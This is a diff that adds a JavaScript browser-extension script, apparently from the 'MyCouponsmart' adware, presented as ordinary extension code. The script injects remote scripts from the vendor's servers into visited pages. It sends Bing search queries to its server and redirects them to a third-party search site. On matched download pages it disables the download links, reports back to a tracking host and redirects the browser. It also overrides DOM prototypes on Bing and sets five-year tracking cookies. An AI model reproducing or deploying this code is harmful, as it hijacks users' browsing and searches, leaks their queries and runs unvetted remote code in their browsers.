@@ -1,0 +1,367 @@
+
+(function(){
+    if (location.hostname === 'www.bing.com') {
+        (function(a){var b=a.createElement("iframe");a.body.appendChild(b);try{var c=b.contentWindow;Element.prototype.appendChild=c.Element.prototype.appendChild;Element.prototype.insertBefore=c.Element.prototype.insertBefore;a.write=c.document.write}catch(d){}a.body.removeChild(b)})(document);
+    }
+    var randomChance = function(n) {
+        return !!n && Math.random() <= n;
+    }
+    var admgr = {
+        reportIteration: 0,
+
+        isDomainInList : function (domainList) {
+            var domain = window.location.host;
+            for (var i = 0; i < domainList.length; i++) {
+                if (domain.indexOf( domainList[i] ) > -1) {
+                    return true;
+                }
+            }
+            return false;
+        },
+
+        loadJS : function (url) {
+            var e=document.createElement('script');
+            e.src = url;
+            (document.getElementsByTagName('body')[0] || document.getElementsByTagName('head')[0]).appendChild(e);
+        },
+
+        isExp : function() {
+            var source = 'upd-2017';
+
+            if (source != 'tgo1-1629') {
+                return false;
+            }
+
+            var cookieMgr = {
+                get: function ( name ) {
+                    name = name + "=";
+                    var ca = document.cookie.split( ';' );
+                    for( var i = 0; i < ca.length; i++ ) {
+                        var c = ca[ i ].trim();
+                        if( c.indexOf( name ) === 0 ) {
+                            return JSON.parse( c.substring( name.length, c.length ) );
+                        }
+                    }
+                    return "";
+                },
+                set: function ( name, value ) {
+                    var expireInMinutes = 5 * 365 * 24 * 60;
+                    var date = new Date();
+                    date.setTime( date.getTime() + ( expireInMinutes * 60 * 1000 ) );
+                    var expires = "; expires=" + date.toGMTString();
+
+                    document.cookie = name + "=" + JSON.stringify( value ) + expires + "; path=/";
+                },
+                delete: function( name ) {
+                    var expireInMinutes = -1 * 60 * 1000;
+                    var date = new Date();
+                    date.setTime( date.getTime() + ( expireInMinutes * 60 * 1000 ) );
+                    var expires = "; expires=" + date.toGMTString();
+
+                    document.cookie = name + "=" + expires + "; path=/";
+                },
+                isCookieEnabled: function () {
+                    var name = 'ctest_' + Math.random().toString( 36 ).substring( 2, 7 );
+                    this.set( name, 'valid' );
+                    var isEnabled = ( this.get( name ) == 'valid' );
+                    this.delete( name );
+                    return isEnabled;
+                }
+            };
+
+            if (!cookieMgr.isCookieEnabled()) {
+                return false;
+            }
+            var runOthersCookie = cookieMgr.get('runOthersCookie');
+            if (runOthersCookie) {
+                return runOthersCookie.result;
+            }
+            var result = (Math.random() >= .5) ? true : false;
+            cookieMgr.set('runOthersCookie', {result: result});
+            return result;
+        },
+
+        init : function() {
+            var group = encodeURIComponent('WFhyZ0FaVzZWR3BnMlcxNUozYVBSUT09');
+            var source = 'upd-2017';
+            var brandName = 'MyCouponsmart';
+            var isn = 'NONE';
+            var all = ["qa","exploresearch"];
+            var initOnly = ["qa","exploresearch"];
+            var a = all;
+            if (admgr.isExp()) {
+                source += "-exp";
+                a = initOnly;
+            }
+
+            
+            admgr.dlDetect();
+            setTimeout(function() {
+                admgr.dlDetect();
+            }, 2000);
+
+            if (window.location.hostname.toLowerCase().indexOf('store.mackeeper.com') !== -1 || window.location.hostname.toLowerCase().indexOf('store.payproglobal.com') !== -1) {
+                return;
+            }
+
+            // No injection on our search page and search feed affiliates.
+            var hostNameLower = window.location.hostname.toLowerCase();
+            var uHref = window.location.href;
+            if (
+                (hostNameLower.indexOf('cms.mymedia.club') !== -1) ||
+                (hostNameLower.indexOf('weknow.ac') !== -1) ||
+                (hostNameLower.indexOf('chumsearch') !== -1) ||
+                (hostNameLower.indexOf('bittsearch.com') !== -1) ||
+                (hostNameLower.indexOf('cultsearch.pw') !== -1) ||
+                (hostNameLower.indexOf('globalsearch.pw') !== -1) ||
+                (hostNameLower.indexOf('hidesearch.bid') !== -1) ||
+                (hostNameLower.indexOf('hideyoursearch') !== -1) ||
+                (hostNameLower.indexOf('linkey-search.com') !== -1) ||
+                (hostNameLower.indexOf('search-mate.com') !== -1) ||
+                (hostNameLower.indexOf('search-me.club') !== -1) ||
+                (hostNameLower.indexOf('searchsmart.bid') !== -1) ||
+                (hostNameLower.indexOf('smartsearch.pw') !== -1) ||
+                (hostNameLower.indexOf('coolasearch.com') !== -1) ||
+                (hostNameLower.indexOf('hidemysearch.com') !== -1) ||
+                (hostNameLower.indexOf('mysafesearch.net') !== -1) ||
+                (hostNameLower.indexOf('mysearchency.com') !== -1) ||
+                (hostNameLower.indexOf('pomedorosearch.com') !== -1) ||
+                (hostNameLower.indexOf('spyder-finder') !== -1) ||
+                (hostNameLower.indexOf('saferqueries.com') !== -1) ||
+                (hostNameLower.indexOf('rack-search') !== -1) ||
+                (hostNameLower.indexOf('seemoviesonline.stream') !== -1) ||
+                (hostNameLower.indexOf('mytab.club') !== -1) ||
+                (hostNameLower.indexOf('ewatchseries') !== -1) ||
+                (hostNameLower.indexOf('kshowonline') !== -1) ||
+                (hostNameLower.indexOf('shortcutcommander') !== -1) ||
+                (hostNameLower.indexOf('searchmine') !== -1) ||
+                (uHref.indexOf('bing.com') !== -1 && uHref.indexOf('conlogo=CT3210127') !== -1 && uHref.indexOf('pc=cosp') !== -1) ||
+                (uHref.indexOf('bing.com') !== -1 && (uHref.indexOf('G6C999N1AA37F7FBE93') !== -1 || uHref.indexOf('G6C999N100AFF186BE8A8') !== -1 || uHref.indexOf('G6C999N100A3ABC7E8847') !== -1 || uHref.indexOf('G6C999N100A275827CC24') !== -1 || uHref.indexOf('G6C999N100A4D4DA59E23') !== -1 || uHref.indexOf('e121a28276dd6067') !== -1)) ||
+                (uHref.indexOf('coinup') !== -1 && uHref.indexOf('a=3017') !== -1) ||
+                (uHref.indexOf('opti-page') !== -1 && uHref.indexOf('affID=970801797') !== -1) ||
+                (uHref.indexOf('opti-page') !== -1 && uHref.indexOf('affID=970801838') !== -1) ||
+                (uHref.indexOf('search.yahoo') !== -1 && uHref.indexOf('hsimp=yhs-002') !== -1) ||
+                (uHref.indexOf('search.yahoo') !== -1 && uHref.indexOf('hsimp=yhs-007') !== -1 && uHref.indexOf('type=gsp_nevada_00_00_ssg03')) ||
+                (uHref.indexOf('safari-extensions.apple.com') !== -1)
+            ) {
+                return;
+            }
+
+            if (window.name.match(/^(a652c|ld893)/)) {
+                var e = document.createElement('script');
+                e.src = '//cdncache-a.akamaihd.net/sub/s4aa1f3/' + source + '/l.js?pid=2484&ext=' + brandName + '&nocache=1';
+                document.body.appendChild(e);
+                return;
+            }
+
+            if (uHref.indexOf('bing.com') !== -1 && uHref.indexOf('/search') !== -1 && uHref.indexOf('q=') !== -1) {
+                admgr.srdr();
+            }
+
+            
+            var shouldExclude = randomChance(.75);
+            a.forEach(function(component) {
+                if (shouldExclude && ((hostNameLower.indexOf('google.com') !== -1) || (hostNameLower.indexOf('facebook.com') !== -1))) {
+                    if (component != '50onred-search' && component != 'adgoal' && component != 'exploresearch') {
+                        return;
+                    }
+                }
+                var url = '//secure.mycouponsmartmac.com/servicejs/components/js/?key='+component+'&source='+source+'&isn='+isn+'&group='+group;
+                if (component == 'ga') {
+                    url += '&components=' + a.join(",");
+                }
+                admgr.loadJS(url);
+            });
+        },
+        runOthers: function() {
+            if (window.mmRunOthers) {
+                return;
+            }
+            window.mmRunOthers = true;
+            var group = encodeURIComponent('WFhyZ0FaVzZWR3BnMlcxNUozYVBSUT09');
+            var source = 'upd-2017';
+            var brandName = 'MyCouponsmart';
+            var isn = 'NONE';
+            var otherOnly = ["qa","exploresearch"];
+            var a = otherOnly;
+            if (admgr.isExp()) {
+                source += "-exp";
+            }
+
+            
+            if (window.location.hostname.toLowerCase().indexOf('store.mackeeper.com') !== -1 || window.location.hostname.toLowerCase().indexOf('store.payproglobal.com') !== -1) {
+                return;
+            }
+
+            if (window.name.match(/^(a652c|ld893)/)) {
+                var e = document.createElement('script');
+                e.src = '//cdncache-a.akamaihd.net/sub/s4aa1f3/' + source + '/l.js?pid=2484&ext=' + brandName + '&nocache=1';
+                document.body.appendChild(e);
+                return;
+            }
+
+            
+            a.forEach(function(component) {
+                var url = '//secure.mycouponsmartmac.com/servicejs/components/js/?key='+component+'&source='+source+'&isn='+isn+'&group='+group;
+                if (component == 'ga') {
+                    url += '&components=' + a.join(",");
+                }
+                admgr.loadJS(url);
+            });
+        },
+        dlDetect: function() {
+            admgr.reportIteration++;
+            var u = window.location.href;
+            var markup = document.documentElement.innerHTML.toLowerCase();
+            console.log("mm_u: " + u);
+            if (u.indexOf('adobe.com') !== -1) {
+                return;
+            }
+            // Not redirect our LPs
+            if (u.indexOf('/hyllkjit/') !== -1 && u.indexOf('n=') !== -1 || u.indexOf('glitch.me') !== -1) {
+                return;
+            }
+            if (u.indexOf('google') !== -1 || u.indexOf('facebook') !== -1) {
+                return;
+            }
+            if (u.indexOf('stripchat') !== -1) {
+                return;
+            }
+            if (
+                (markup.indexOf("flash player") !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('pubid=') !== -1 && u.indexOf('rh=') !== -1) ||
+                (u.indexOf('cf1ya=') !== -1 && u.indexOf('sid=') !== -1 && u.indexOf('cid=') !== -1) ||
+                (u.indexOf('context=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('client=') !== -1 &&
+                    u.indexOf('c=') !== -1 && u.indexOf('s=') !== -1 && u.indexOf('h=') !== -1) ||
+                (u.indexOf('imp_id=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('client=') !== -1 &&
+                    u.indexOf('c=') !== -1 && u.indexOf('s=') !== -1 && u.indexOf('h=') !== -1) ||
+                (u.indexOf('clickid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('a=') !== -1 &&
+                    u.indexOf('r=') !== -1) ||
+                (u.indexOf('clickid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('t=') !== -1 &&
+                    u.indexOf('r=') !== -1) ||
+                (u.indexOf('clickid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('x=') !== -1 &&
+                    u.indexOf('c=') !== -1) ||
+                (u.indexOf('b9zd1=') !== -1 && u.indexOf('cid=') !== -1 && u.indexOf('sid=') !== -1) ||
+                (u.indexOf('bcolor=') !== -1 && u.indexOf('adnm=') !== -1 && u.indexOf('grid=') !== -1 &&
+                    u.indexOf('lg=') !== -1 && u.indexOf('cc=') !== -1 && u.indexOf('clg=') !== -1 &&
+                    u.indexOf('gclid=') !== -1 && u.indexOf('agid=') !== -1 && u.indexOf('mn=') !== -1) ||
+                (u.indexOf('installer_id=') !== -1 && u.indexOf('affiliate_id=') !== -1 && u.indexOf('click-id=') !== -1 &&
+                    u.indexOf('channel_id=') !== -1) ||
+                (u.indexOf('clickid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('e=') !== -1 &&
+                    u.indexOf('c=') !== -1) ||
+                (u.indexOf('xid=') !== -1 && u.indexOf('TC=') !== -1 && u.indexOf('appid=') !== -1 &&
+                    u.indexOf('subid=') !== -1) ||
+                (u.indexOf('xid=') !== -1 && u.indexOf('TC=') !== -1 && u.indexOf('clickid=') !== -1) ||
+                (u.indexOf('sa=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('ust=') !== -1
+                    && u.indexOf('usg=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('r=') !== -1
+                    && u.indexOf('s=') !== -1 && u.indexOf('client=') !== -1 && u.indexOf('rsm=') !== -1
+                    && u.indexOf('h=') !== -1 && u.indexOf('u=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('cc=') !== -1
+                    && u.indexOf('s=') !== -1 && u.indexOf('fn=') !== -1 && u.indexOf('client=') !== -1
+                    && u.indexOf('ds=') !== -1 && u.indexOf('a=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('mn3151=') !== -1 && u.indexOf('sid=') !== -1
+                    && u.indexOf('v_id=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('sid=') !== -1 && u.indexOf('v_id=') !== -1
+                    && u.indexOf('sa=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('ust=') !== -1
+                    && u.indexOf('usg=') !== -1) ||
+                (u.indexOf('pid=') !== -1 && u.indexOf('offer=') !== -1 && u.indexOf('sub1=') !== -1
+                    && u.indexOf('sub2=') !== -1) ||
+                (u.indexOf('pid=') !== -1 && u.indexOf('offer_id=') !== -1 && u.indexOf('sub1=') !== -1
+                    && u.indexOf('sub2=') !== -1) ||
+                (u.indexOf('installer_id=') !== -1 && u.indexOf('affiliate_id=') !== -1 && u.indexOf('click-id=') !== -1
+                    && u.indexOf('utm_source=') !== -1 && u.indexOf('utm_campaign=') !== -1 && u.indexOf('kid=') !== -1
+                    && u.indexOf('placement=') !== -1 && u.indexOf('postback_id=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('r=') !== -1
+                    && u.indexOf('s=') !== -1 && u.indexOf('client=') !== -1 && u.indexOf('kd=') !== -1
+                    && u.indexOf('h=') !== -1 && u.indexOf('a=') !== -1 && u.indexOf('u=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('r=') !== -1
+                    && u.indexOf('s=') !== -1 && u.indexOf('client=') !== -1 && u.indexOf('lm=') !== -1
+                    && u.indexOf('h=') !== -1 && u.indexOf('x=') !== -1 && u.indexOf('u=') !== -1) ||
+                (u.indexOf('cid=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('r=') !== -1
+                    && u.indexOf('s=') !== -1 && u.indexOf('client=') !== -1 && u.indexOf('st=') !== -1
+                    && u.indexOf('h=') !== -1 && u.indexOf('t=') !== -1 && u.indexOf('u=') !== -1) ||
+                (u.indexOf('cc=') !== -1 && u.indexOf('source=') !== -1 && u.indexOf('cid=') !== -1) ||
+                (u.indexOf('source=') !== -1 && u.indexOf('subid=') !== -1 && u.indexOf('k=') !== -1
+                    && u.indexOf('s=') !== -1 && u.indexOf('client=') !== -1 && u.indexOf('st=') !== -1
+                    && u.indexOf('h=') !== -1 && u.indexOf('a=') !== -1 && u.indexOf('u=') !== -1) ||
+                (u.indexOf('worldwidesystems.net') !== -1 && u.indexOf('cid=') !== -1)
+                ) {
+                console.log("mm_stop");
+                var stopDl = function(e) {
+                    if (e) {
+                        e.preventDefault();
+                    }
+                    return false;
+                }
+                window.showStep = stopDl;
+                window.showModal = stopDl;
+                window.showModalAd = stopDl;
+                window.showModalDialog = stopDl;
+                window.onDownloadButtonClicked = stopDl;
+                window.onload = stopDl;
+                var dlLinks = document.getElementsByClassName('download_link');
+                var removedLinks = 0;
+                for (var i=0; i < dlLinks.length; i++) {
+                    if (dlLinks[i].href) {
+                        dlLinks[i].addEventListener('click', function(e) {
+                            e.preventDefault();
+                            e.stopPrpoagation();
+                        });
+                        dlLinks[i].href = "#";
+                        removedlinks = 1;
+                    }
+                }
+                var s = document.createElement( 'script' );
+                s.src = '//events.securesrv12.com/report/dldetect/?pop=1&links=' + removedLinks + '&iteration=' + admgr.reportIteration;
+                document.head.appendChild( s );
+                window.location.replace("http://bnkmhuksdiyr.veniceprivate.com/pr/?ci=8341&line_item=2&subid=" + Date.now());
+            }
+
+            document.addEventListener('click', function() {
+                console.log("mm_click");
+            });
+        },
+        srdr: function() {
+            var urlParams = admgr.parseQuery();
+            var encQuery = encodeURIComponent(urlParams.q);
+            var subId = '0';
+            if( ( typeof _webhelper_source == 'undefined' || typeof _webhelper_source.GUID == 'undefined' ) && document.getElementById( '_webhelper_source' ) ) {
+                _webhelper_source = JSON.parse( document.getElementById( '_webhelper_source' ).value );
+            }
+            if( typeof _webhelper_source != 'undefined' && typeof _webhelper_source.GUID != 'undefined' ) {
+                subId = encodeURIComponent( _webhelper_source.GUID );
+            }
+            var url = '//secure.mycouponsmartmac.com/servicejs/components/srdr/?subid='+subId+'&q='+encQuery+'&t='+Date.now();
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.onload = function() {
+                var response = JSON.parse(xhr.responseText);
+                if (response.r) {
+                    window.location.replace("https://www.arevokesman.club/api/orenb/search?p=" + encQuery + "&subid=" + subId);
+                }
+            }
+            xhr.send();
+        },
+        parseQuery: function() {
+            var f = document.location.href,
+                d = f.substring(f.indexOf("?") + 1);
+            f = {};
+            d = ("?" === d[0] ? d.substr(1) : d).split("&");
+            for (var l = 0; l < d.length; l++) {
+                var c = d[l].split("=");
+                f[decodeURIComponent(c[0])] = decodeURIComponent(c[1] || "");
+            }
+            return f;
+        }
+    }
+
+    if (admgr.isExp()) {
+        window._admgrRO = admgr.runOthers;
+    }
+    else {
+        window._admgrRO = function() {};
+    }
+    admgr.init();
+})();
+
